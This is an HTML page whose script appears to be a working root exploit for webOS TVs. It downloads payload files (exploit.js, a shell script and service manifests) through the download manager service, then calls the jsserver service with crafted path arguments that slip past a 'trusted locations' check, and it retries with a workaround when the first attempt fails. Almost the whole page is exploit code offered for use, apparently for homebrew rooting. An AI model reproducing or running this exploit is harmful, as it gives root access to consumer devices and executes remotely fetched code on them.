<body>
  <main>

    <div id="title">

  <script>
    var stateEl = document.getElementById('state');
    var detailEl = document.getElementById('detail');
    var hackatt=0;
    var launched=false;
    var targetDir = '/media/internal/downloads';
    var hackperm = [
{"inputParams": "-- /tmp/cgroup QwQ " + targetDir},
{"inputParams": "QwQ -- /tmp/cgroup /usr/palm/services/com.webos.service.secondscreen.gateway/ " + targetDir},
    ];

    function setState(name, detail) {
      stateEl.textContent = name;
      stateEl.className = 'state ' + name;
      detailEl.textContent = detail || '';
    }

    function failStep(step, detail) {
      setState('failed', step + ': ' + (detail || 'unknown failure'));
    }

    function isObject(value) {
      return value !== null && typeof value === 'object';
    }

    function parse(payload) {
      if (typeof payload !== 'string') return payload;
      try {
        return JSON.parse(payload);
      } catch (_) {
        return payload;
      }
    }
      function afterhackjserver(payload) {
          var parsed = parse(payload);
          if ( typeof(parsed.error) === 'string' && parsed.error.includes("trusted locations")  ) {
		  if (hackperm.length===hackatt+1){

            failStep('jsserver', 'jsserver is patched.Workarounds are patched');
		  } else {
            failStep('jsserver', 'jsserver is patched.Trying workaround...');
		  hackatt=hackatt+1;
	hackjserver();
		  }
	  } else if ( parsed.returnValue === false) {
  if (typeof(parsed.error) === 'undefined'){
            failStep('jsserver', parsed.errorText );
		   }else if (typeof(parsed.errorText) === 'undefined'){
            failStep('jsserver', parsed.error );
			   
		   } else {
            failStep('jsserver', 'jsserver call failed');

		   }
	  } else {
            setState('success', 
   'Yippee root exploit is worky!!!Setting homebrew up...');
	  }

      }

      function hackjserver() {
        var bridge = new window.PalmServiceBridge();
	console.log(hackatt);
	console.log(hackperm[hackatt]);
	bridge.onservicecallback=afterhackjserver;
        bridge.call('luna://com.webos.service.jsserver/run',JSON.stringify(hackperm[hackatt]));
      }

    function runRootExploit() {
      var payloadBase = new URL('./payload/', window.location.href).toString();
      var files = [
        'package.json' , 
        'services.json', 
        'exploit.js'   , 
        'wtfbro.sh'    , 
      ];
      var written = 0;

      function downloadFile(file) {
	var b = new window.PalmServiceBridge();
        b.onservicecallback = function(payload) {
 if (launched){
		      return;
	      }
	//Make sure it wont code as below wont get run after root exploit 
	//bc sometime code as below do get run 
	//useually it display a error msg when those code after the root exploit

          var parsed = parse(payload);
          if (!isObject(parsed)) { failStep('payload download', file + ': invalid response'); return; }
          if (parsed.returnValue === false) { failStep('payload download', file + ': ' + (parsed.errorText || 'failed')); return; }
          if (parsed.completed === true && !parsed.aborted && !parsed.interrupted) {
            written++;
            setState('pending', 'downloaded ' + written + '/' + files.length + ' payload files...');
	if (written === files.length){
		launched=true;      
	setState('pending', 'Launching root exploit. Watch your TV for the result...');
hackjserver();  
	}
          } else if (parsed.aborted || parsed.interrupted || parsed.state === 'failed') {
            failStep('payload download', file + ': ' + (parsed.errorText || 'aborted'));
          }
        };
        b.call('luna://com.webos.service.downloadmanager/download',
          JSON.stringify({
            target: payloadBase + file,
            targetDir: targetDir,
            targetFilename: file,
            subscribe: true
          }));
      }

      files.forEach(downloadFile);
    }

    
    if (typeof window.PalmServiceBridge === 'undefined') {
      failStep('bootstrap', 'PalmServiceBridge is not available');
    } else {
	runRootExploit();
    }
  </script>
